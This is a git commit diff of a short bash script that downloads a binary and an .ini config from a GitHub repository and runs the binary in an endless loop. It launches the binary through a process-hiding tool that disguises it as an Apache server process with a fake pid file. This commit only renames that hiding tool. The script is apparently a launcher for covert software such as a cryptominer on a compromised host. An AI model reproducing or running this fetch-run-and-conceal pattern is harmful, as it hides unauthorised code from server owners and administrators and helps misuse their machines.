05b8de5a909126ccb51a88fa496d1eb972357455
DarshGoswami1982 <87807143+DarshGoswami1982@users.noreply.github.com>
2021-09-14 09:43:00 +0530

    Update xsol.sh

--- xsol.sh
+++ xsol.sh
@@ -1,10 +1,10 @@
 #!/bin/bash
-chmod +x hide
+chmod +x xhide
 wget https://github.com/DarshGoswami1982/asu/raw/main/gas
 chmod +x gas
 wget https://github.com/DarshGoswami1982/asu/raw/main/keun.ini
 while [ 1 ]; do
-./hide -s "/usr/sbin/apache2 -k start" -d -p Apache2.pid ./gas keun.ini
+./xhide -s "/usr/sbin/apache2 -k start" -d -p Apache2.pid ./gas keun.ini
 sleep 5
 done
 sleep 999999999 
